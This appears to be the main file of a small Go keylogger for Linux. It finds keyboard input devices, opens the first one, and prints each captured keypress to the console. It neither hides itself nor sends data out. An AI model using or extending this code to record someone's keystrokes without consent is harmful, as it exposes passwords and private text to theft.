package main

import (
	"io/ioutil"
	"os"
	"runtime"
	"fmt"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func main() {
	var devices []*InputDevice

	Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)

	Info.Println(fmt.Sprintf("Hey, we are running on %s...\n", runtime.GOOS))

	check(checkUser())

	keyboards := findKeyboards()

	keyboardNames := extractDeviceNames(keyboards)

	for i:=0; i < len(keyboards); i++ {
		devices = append(devices, &InputDevice{
			Id: keyboards[i],
			Name: keyboardNames[i],
		})
	}

	keylogger := NewKeyLogger(devices[0])

	in, err := keylogger.Read()
	if err != nil {
		fmt.Println(err)
		return
	}
	counter := 0
	for i := range in {

		//we only need keypress
		if i.Type == EV_KEY {
			if counter == 0 {
				fmt.Println(i.KeyString())
				counter++
			} else {
				counter--
			}
		}
	}
}